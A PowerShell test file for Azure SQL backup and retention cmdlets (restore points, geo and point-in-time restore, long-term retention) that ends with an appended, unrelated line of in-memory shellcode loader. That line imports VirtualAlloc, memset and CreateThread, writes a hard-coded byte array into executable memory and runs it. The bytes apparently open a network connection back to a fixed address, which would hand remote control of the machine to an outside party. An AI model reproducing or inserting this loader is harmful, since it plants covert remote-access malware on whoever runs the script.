














function Test-ListDatabaseRestorePoints
{
	
	$location = "Southeast Asia"
	$serverVersion = "12.0";
	$rg = Create-ResourceGroupForTest

	try
	{
		$server = Create-ServerForTest $rg $location

		
		$databaseName = Get-DatabaseName
		$dwdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName `
			-Edition DataWarehouse -RequestedServiceObjectiveName DW100

		$databaseName = Get-DatabaseName
		$standarddb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName `
			-Edition Standard -RequestedServiceObjectiveName S0

		
		$restorePoints = Get-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName
		Assert-Null $restorePoints 

		
		$restorePoints = $standarddb | Get-AzSqlDatabaseRestorePoint 
		Assert-AreEqual $restorePoints.Count 1 
		$restorePoint = $restorePoints[0]
		Assert-AreEqual $restorePoint.RestorePointType Continuous
		Assert-Null $restorePoint.RestorePointCreationDate
		Assert-AreEqual $restorePoint.EarliestRestoreDate.Kind Utc
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}

function Test-RestoreGeoBackup
{
	
	$location = "Southeast Asia"
	$serverVersion = "12.0"
	$rg = Get-AzResourceGroup -ResourceGroupName payi-test
	$server = Get-AzSqlServer -ServerName payi-testsvr -ResourceGroupName $rg.ResourceGroupName
	$db = Get-AzSqlDatabase -ServerName $server.ServerName -DatabaseName payi-testdb-geo2 -ResourceGroupName $rg.ResourceGroupName
	$restoredDbName = "powershell_db_georestored2"
	$restoredVcoreDbName = "powershell_db_georestored_vcore"

	$geobackup = Get-AzSqlDatabaseGeoBackup -ResourceGroupName $server.ResourceGroupName -ServerName $server.ServerName -DatabaseName $db.DatabaseName 
	
	$job = Restore-AzSqlDatabase -FromGeoBackup -TargetDatabaseName $restoredDbName -ResourceGroupName $geobackup.ResourceGroupName `
		-ServerName $geobackup.ServerName -ResourceId $geobackup.ResourceId -AsJob
	$job | Wait-Job

	
	Restore-AzSqlDatabase -FromGeoBackup -TargetDatabaseName $restoredVcoreDbName -ResourceGroupName $geobackup.ResourceGroupName `
		-ServerName $geobackup.ServerName -ResourceId $geobackup.ResourceId -Edition "GeneralPurpose" -VCore 2 -ComputeGeneration "Gen4"
}

function Test-RestoreDeletedDatabaseBackup
{
	
	$location = "Southeast Asia"
	$serverVersion = "12.0"
	$rg = Get-AzResourceGroup -ResourceGroupName payi-test
	$server = Get-AzSqlServer -ServerName payi-testsvr -ResourceGroupName $rg.ResourceGroupName
	$droppedDbName = "powershell_db_georestored"
	$restoredDbName = "powershell_db_deleted"
	$restoredVcoreDbName = "powershell_db_deleted_vcore"

	
	$deletedDb = Get-AzSqlDeletedDatabaseBackup -ResourceGroupName $server.ResourceGroupName -ServerName $server.ServerName `
		-DatabaseName $droppedDbName 

	
	Restore-AzSqlDatabase -FromDeletedDatabaseBackup -TargetDatabaseName $restoredDbName -DeletionDate "2018-04-20 20:21:37.397Z" `
		-ResourceGroupName $deletedDb[0].ResourceGroupName -ServerName $deletedDb[0].ServerName -ResourceId $deletedDb[0].ResourceId
	
	
	Restore-AzSqlDatabase -FromDeletedDatabaseBackup -TargetDatabaseName $restoredVcoreDbName -DeletionDate "2018-04-20 20:21:37.397Z" `
		-ResourceGroupName $deletedDb[0].ResourceGroupName -ServerName $deletedDb[0].ServerName -ResourceId $deletedDb[0].ResourceId -Edition "GeneralPurpose" `
		-VCore 2 -ComputeGeneration "Gen4"
}

function Test-RestorePointInTimeBackup
{
	
	$location = "Southeast Asia"
	$serverVersion = "12.0"
	$rg = Get-AzResourceGroup -ResourceGroupName payi-test
	$server = Get-AzSqlServer -ServerName payi-testsvr -ResourceGroupName $rg.ResourceGroupName
	$db = Get-AzSqlDatabase -ServerName $server.ServerName -DatabaseName payi-testdb -ResourceGroupName $rg.ResourceGroupName
	$restoredDbName = "powershell_db_restored"
	$restoredVcoreDbName = "powershell_db_restored_vcore"

	
	Restore-AzSqlDatabase -FromPointInTimeBackup -PointInTime "2018-04-18T20:20:00Z" -TargetDatabaseName $restoredDbName -ResourceGroupName $db.ResourceGroupName `
	-ServerName $db.ServerName -ResourceId $db.ResourceId

	
	Restore-AzSqlDatabase -FromPointInTimeBackup -PointInTime "2018-04-18T20:20:00Z" -TargetDatabaseName $restoredVcoreDbName -ResourceGroupName $db.ResourceGroupName `
		-ServerName $db.ServerName -ResourceId $db.ResourceId -Edition 'GeneralPurpose' -VCore 2 -ComputeGeneration 'Gen4'
}



function Test-RestoreLongTermRetentionBackup
{
	$location = "North Europe"
	$serverVersion = "12.0"
	$rg = Get-AzResourceGroup -ResourceGroupName hchung
	$server = Get-AzSqlServer -ServerName hchung-testsvr -ResourceGroupName $rg.ResourceGroupName
	$restoredDbName = "powershell_db_restored_ltr"
	$recoveryPointResourceId = "/subscriptions/e5e8af86-2d93-4ebd-8eb5-3b0184daa9de/resourceGroups/hchung/providers/Microsoft.RecoveryServices/vaults/hchung-testvault/backupFabrics/Azure/protectionContainers/AzureSqlContainer;Sql;hchung;hchung-testsvr/protectedItems/AzureSqlDb;dsName;hchung-testdb;fbf5641f-77f8-43b7-8fd7-5338ec293213/recoveryPoints/1731556986347"

    Restore-AzSqlDatabase -FromLongTermRetentionBackup -ResourceId $recoveryPointResourceId -TargetDatabaseName $restoredDbName `
		-ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName
}

function Test-LongTermRetentionV2Policy($location = "westcentralus")
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West central US"
	$rg = Create-ResourceGroupForTest
	$server = Create-ServerForTest $rg $location
	$weeklyRetention1 = "P1W"
	$weeklyRetention2 = "P2W"
	$emptyRetention = "PT0S"

	try
	{
		
		$databaseName = Get-DatabaseName
		$db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName

		
		Set-AzSqlDatabaseLongTermRetentionPolicy -ResourceGroup $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName -WeeklyRetention $weeklyRetention2
		$policy = Get-AzSqlDatabaseLongTermRetentionPolicy -ResourceGroup $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
		Assert-AreEqual $policy.WeeklyRetention $weeklyRetention2
		Assert-AreEqual $policy.MonthlyRetention $emptyRetention
		Assert-AreEqual $policy.YearlyRetention $emptyRetention

		
		Set-AzSqlDatabaseBackupLongTermRetentionPolicy -ResourceGroup $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName -WeeklyRetention $weeklyRetention1
		$policy = Get-AzSqlDatabaseBackupLongTermRetentionPolicy -ResourceGroup $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
		Assert-AreEqual $policy.WeeklyRetention $weeklyRetention1
		Assert-AreEqual $policy.MonthlyRetention $emptyRetention
		Assert-AreEqual $policy.YearlyRetention $emptyRetention
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}

function Test-LongTermRetentionV2Backup($location = "westcentralus")
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West central US"
	$rg = Create-ResourceGroupForTest
	$server = Create-ServerForTest $rg $location

	try
	{
		
		$databaseName = Get-DatabaseName
		$db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
		
		
		Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location
		
		$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location -ServerName $server.ServerName
		Assert-AreEqual $backups.Count 0
		$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location -ServerName $server.ServerName -DatabaseName $databaseName -BackupName *
		Assert-AreEqual $backups.Count 0
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}

function Test-LongTermRetentionV2ResourceGroupBasedBackup($location = "westcentralus")
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West central US"
	$rg = Create-ResourceGroupForTest
	$server = Create-ServerForTest $rg $location

	try
	{
		
		$databaseName = Get-DatabaseName
		$db = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
		
		
		Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location -ResourceGroupName $server.ResourceGroupName
		
		$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location -ServerName $server.ServerName -ResourceGroupName $server.ResourceGroupName
		$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $db.Location -ServerName $server.ServerName -DatabaseName $databaseName -BackupName * -ResourceGroupName $server.ResourceGroupName
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}

function Test-LongTermRetentionV2
{

	
	
	
	
	
	
	$resourceGroup = "Default-SQL-WestCentralUS"
	$locationName = "westcentralus"
	$serverName = "trgrie-ltr-server"
	$databaseName = "testdb2"
	$weeklyRetention1 = "P1W"
	$weeklyRetention2 = "P2W"
	$restoredDatabase = "testdb5"
	$databaseWithRemovableBackup = "testdb";

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName -BackupName $backups[0].BackupName
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup -BackupName $backups[0].BackupName
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName -OnlyLatestPerDatabase -DatabaseState All
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup -OnlyLatestPerDatabase
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName
	$db = Restore-AzSqlDatabase -FromLongTermRetentionBackup -ResourceId $backups[0].ResourceId -ResourceGroupName $resourceGroup -ServerName $serverName -TargetDatabaseName $restoredDatabase
	Assert-AreEqual $db.DatabaseName $restoredDatabase

	
	
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseWithRemovableBackup | Get-AzSqlDatabaseLongTermRetentionBackup -OnlyLatestPerDatabase
	Assert-AreEqual $backups.Count 0

	
	Remove-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $restoredDatabase
}

function Test-LongTermRetentionV2ResourceGroupBased
{

	
	
	
	
	
	
	$resourceGroup = "brrg"
	$locationName = "brazilsouth"
	$serverName = "ltrtest3"
	$databaseName = "mydb"
	$restoredDatabase = "mydb_restore"
	$databaseWithRemovableBackup = "mydb";

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ResourceGroupName $resourceGroup
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -ResourceGroupName $resourceGroup
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName -ResourceGroupName $resourceGroup
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName -BackupName $backups[0].BackupName -ResourceGroupName $resourceGroup
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup
	Assert-AreNotEqual $backups.Count 0
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup -BackupName $backups[0].BackupName
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseName -ResourceGroupName $resourceGroup -OnlyLatestPerDatabase -DatabaseState All
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $databaseName | Get-AzSqlDatabaseLongTermRetentionBackup -OnlyLatestPerDatabase
	Assert-AreNotEqual $backups.Count 0

	
	$backups = Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ResourceGroupName $resourceGroup
	$db = Restore-AzSqlDatabase -FromLongTermRetentionBackup -ResourceId $backups[0].ResourceId -ResourceGroupName $resourceGroup -ServerName $serverName -TargetDatabaseName $restoredDatabase
	Assert-AreEqual $db.DatabaseName $restoredDatabase

	
	Get-AzSqlDatabaseLongTermRetentionBackup -Location $locationName -ServerName $serverName -DatabaseName $databaseWithRemovableBackup -BackupName $backups[0].BackupName -ResourceGroupName $resourceGroup | Remove-AzSqlDatabaseLongTermRetentionBackup -Force

	
	Remove-AzSqlDatabase -ResourceGroup $resourceGroup -ServerName $serverName -DatabaseName $restoredDatabase -Force
}

function Test-DatabaseGeoBackupPolicy
{
	$rg = Get-AzResourceGroup -ResourceGroupName payi-test
	$server = Get-AzSqlServer -ServerName payi-testsvr -ResourceGroupName $rg.ResourceGroupName
	$db = Get-AzSqlDatabase -ServerName $server.ServerName -DatabaseName testdwdb -ResourceGroupName $rg.ResourceGroupName

	
	Set-AzSqlDatabaseGeoBackupPolicy -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName -DatabaseName $db.DatabaseName -State Enabled
	$result = Get-AzSqlDatabaseGeoBackupPolicy -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName -DatabaseName $db.DatabaseName
	Assert-True { $result.State -eq "Enabled" }

	
	Set-AzSqlDatabaseGeoBackupPolicy -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName -DatabaseName $db.DatabaseName -State Disabled
	$result = Get-AzSqlDatabaseGeoBackupPolicy -ServerName $server.ServerName -ResourceGroupName $rg.ResourceGroupName -DatabaseName $db.DatabaseName
	Assert-True { $result.State -eq "Disabled" }
}

function Test-NewDatabaseRestorePoint
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West US 2"
	$serverVersion = "12.0";
	$label = "label01";
	$rg = Create-ResourceGroupForTest

	try
	{
		$server = Create-ServerForTest $rg $location

		
		$databaseName = Get-DatabaseName
		$dwdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName `
			-Edition DataWarehouse -RequestedServiceObjectiveName DW100
			
		New-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName -RestorePointLabel $label

		
		$restorePoints = Get-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName

		
		Assert-AreEqual $restorePoints.Count 1
		$restorePoint = $restorePoints[0]
		Assert-AreEqual $restorePoint.RestorePointType DISCRETE
		Assert-Null $restorePoint.EarliestRestoreDate
		Assert-AreEqual $restorePoint.RestorePointCreationDate.Kind Utc
		Assert-AreEqual $restorePoint.RestorePointLabel $label
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}

function Test-RemoveDatabaseRestorePoint
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West central US"
	$serverVersion = "12.0";
	$label = "label01";
	$rg = Create-ResourceGroupForTest

	try
	{
		$server = Create-ServerForTest $rg $location

		
		$databaseName = Get-DatabaseName
		$dwdb = New-AzSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName `
			-Edition DataWarehouse -RequestedServiceObjectiveName DW100
			
		New-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName -RestorePointLabel $label

		
		$restorePoints = Get-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName

		
		Assert-AreEqual $restorePoints.Count 1
		$restorePoint = $restorePoints[0]
		Assert-AreEqual $restorePoint.RestorePointType DISCRETE
		Assert-Null $restorePoint.EarliestRestoreDate
		Assert-AreEqual $restorePoint.RestorePointCreationDate.Kind Utc

		Remove-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName -RestorePointCreationDate $restorePoint.RestorePointCreationDate

		Wait-Seconds 60
	    
		$restorePoints = Get-AzSqlDatabaseRestorePoint -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $dwdb.DatabaseName

		
		Assert-AreEqual $restorePoints.Count 0
	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}
	
function Test-ShortTermRetentionPolicy
{
	
	$location = Get-Location "Microsoft.Sql" "servers" "West US 2"
	$rg = Create-ResourceGroupForTest $location
	$server = Create-ServerForTest $rg $location

 	
	$invalidRetention = 20

 	try
	{
		
		$databaseName = Get-DatabaseName
		$db = New-AzureRmSqlDatabase -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName

 		
		$retention = 28
		$policy = Set-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName -RetentionDays $retention
		Assert-AreEqual $policy.Count 1
		Assert-AreEqual $retention $policy[0].RetentionDays
		$policy = Get-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -ResourceGroupName $rg.ResourceGroupName -ServerName $server.ServerName -DatabaseName $databaseName
		Assert-AreEqual $policy.Count 1
		Assert-AreEqual $retention $policy[0].RetentionDays

 		
		$retention = 21
		$policy = Set-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -AzureSqlDatabase $db -RetentionDays $retention
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays
		$policy = Get-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -AzureSqlDatabase $db
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays

 		
		$retention = 14
		$resourceId = $db.ResourceId + "/backupShortTermRetentionPolicies/default"
		$policy = Set-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -ResourceId $resourceId -RetentionDays $retention
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays
		$policy = Get-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -ResourceId $resourceId
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays

 		
		$retention = 7
		$policy = $db | Set-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -RetentionDays $retention
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays
		$policy = $db | Get-AzureRmSqlDatabaseBackupShortTermRetentionPolicy
		Assert-AreEqual 1 $policy.Count
		Assert-AreEqual $retention $policy[0].RetentionDays

 		
		try {
			$db | Set-AzureRmSqlDatabaseBackupShortTermRetentionPolicy -RetentionDays $invalidRetention
		}
		catch [System.Management.Automation.PSArgumentException] {
			
			Assert-AreEqual $_.Count 1
		}
 	}
	finally
	{
		Remove-ResourceGroupForTest $rg
	}
}
$lw8 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $lw8 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$sT7U=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($sT7U.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$sT7U,0,0,0);for (;;){Start-sleep 60};

